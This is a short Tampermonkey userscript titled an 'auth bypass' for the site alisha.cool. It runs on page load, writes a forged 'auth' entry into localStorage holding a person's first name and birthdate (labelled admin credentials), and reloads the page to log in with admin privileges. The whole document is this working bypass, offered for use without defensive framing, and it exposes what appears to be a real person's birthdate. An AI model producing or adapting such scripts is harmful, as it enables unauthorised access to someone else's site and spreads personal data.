// ==UserScript==
// @name         Alisha.cool Auth Bypass
// @namespace    http://tampermonkey.net/
// @version      1.0
// @description  Auto-login to alisha.cool with admin privileges
// @author       YourName
// @match        *://alisha.cool/*
// @match        *://*.alisha.cool/*
// @grant        none
// @run-at       document-start
// ==/UserScript==

(function() {
    'use strict';

    // Only execute if auth isn't already set
    if (!localStorage.getItem('auth')) {
        // Set admin credentials
        localStorage.setItem('auth', JSON.stringify({
            firstName: "alisha",
            birthdate: "2004-10-31"
        }));

        // Refresh to apply changes
        window.location.reload();
    }
})();
